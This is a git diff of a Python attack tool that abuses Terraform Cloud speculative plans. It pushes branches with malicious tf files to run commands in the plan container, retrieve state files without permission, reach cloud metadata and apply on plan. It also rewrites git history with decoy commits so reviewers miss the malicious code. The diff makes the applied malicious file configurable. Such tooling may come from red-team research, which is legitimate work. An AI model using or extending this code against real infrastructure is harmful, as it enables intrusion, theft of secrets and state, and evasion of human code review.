@@ -98,7 +98,7 @@ def exec_command(tmp_folder, terraform_folder, command):
     url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
     return url_pr
 
-def apply_on_plan(tmp_folder, terraform_folder):
+def apply_on_plan(tmp_folder, terraform_folder, tf_file_to_apply):
     # Copying template to execute a command
     src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
     # We use a name that is generic but unique
@@ -111,8 +111,8 @@ def apply_on_plan(tmp_folder, terraform_folder):
     template_filled = s.substitute(command="bash instance.tpl")
     open(dst_file, "w").write(template_filled)
    
-    # We add the "malicious tf file" with an AWS S3 bucket
-    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
+    # We add the "malicious tf file"
+    src_file = os.path.join(SCRIPT_PATH, tf_file_to_apply)
     dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance003")
     print(f"[+] Copying template file from {src_file} to {dst_file}")
     shutil.copy(src_file, dst_file) 
@@ -130,7 +130,7 @@ def apply_on_plan(tmp_folder, terraform_folder):
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance003"))
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
     output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
-    print("[+] Pushing apply_on_plan commit to origin")
+    print("[+] Pushing commit to origin")
     output = subprocess.getoutput("git push origin " + TMP_BRANCH)
     url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
     return url_pr
@@ -164,13 +164,13 @@ def get_state_file(tmp_folder, terraform_folder, workspace=None):
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance002.tf"))
     output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "instance.tpl"))
     output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
-    print("[+] Pushing apply_on_plan commit to origin")
+    print("[+] Pushing commit to origin")
     output = subprocess.getoutput("git push origin " + TMP_BRANCH)
     url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
     return url_pr
 
 # To be a bit more sneaky we commit a couple times so it's not as easy to see the malicious code in the PR
-def rewrite_history(tmp_folder):
+def rewrite_history(tmp_folder, terraform_folder):
     # First commit
     fake_template = """
 resource "aws_ec2_host" "template_instance" {
@@ -178,7 +178,7 @@ resource "aws_ec2_host" "template_instance" {
   availability_zone = "us-west-2a"
 }
 """
-    open("nullprovider/template_instance000.tf", "w").write(fake_template)
+    open(os.path.join(terraform_folder, "template_instance000.tf"), "w").write(fake_template)
     subprocess.getoutput("git add nullprovider/template_instance000.tf")
     subprocess.getoutput("git commit -m 'Adding EC2 template'")
     print("[+] Pushing one commit replacing the malicious template")
@@ -191,7 +191,7 @@ resource "aws_ec2_host" "template_instance" {
   availability_zone = "us-west-2a"
 }
 """
-    open("nullprovider/template_instance000.tf", "w").write(fake_template)
+    open(os.path.join(terraform_folder, "template_instance000.tf"), "w").write(fake_template)
     subprocess.getoutput("git add nullprovider/template_instance000.tf")
     subprocess.getoutput("git commit -m 'Changing instance size to c4'")
     print("[+] Pushing one commit with a fake fix")
@@ -211,7 +211,7 @@ def parse_args():
     attack.add_argument('--get_state_file', action='store_true', help="This retrieves the state file of the current TF workspace through a TF plan; useful when the user doesn't have permissions to access the state file")
     attack.add_argument('--get_state_file_from_workspace', type=str, help="This retrieves the state file of a supplied workspace name through a TF plan; useful when the user doesn't have permissions to access the state file")
     attack.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
-    attack.add_argument('--apply_on_plan', action='store_true', help="")    
+    attack.add_argument('--apply_on_plan', type=str, help="Apply on plan an specified tf file")    
     return arg_parser.parse_args()
 
 def main():
@@ -230,7 +230,7 @@ def main():
     elif args.exec_command:
         url_pr = exec_command(tmp_folder, args.folder, args.exec_command)
     elif args.apply_on_plan:
-        url_pr = apply_on_plan(tmp_folder, args.folder)
+        url_pr = apply_on_plan(tmp_folder, args.folder, args.apply_on_plan)
     elif args.get_state_file:
         url_pr = get_state_file(tmp_folder, args.folder)
     elif args.get_state_file_from_workspace:
@@ -246,7 +246,7 @@ def main():
     # ToDo : Ask user if he/she wants to rewrite history to delete what we did
     # (Do that only after the PR has been submmited)
     answer = input("Press any key when you have finished the plan to begin cleanup") 
-    rewrite_history(tmp_folder)
+    rewrite_history(tmp_folder,  args.folder)
 
     # Remove temporal folder
     shutil.rmtree(tmp_folder)
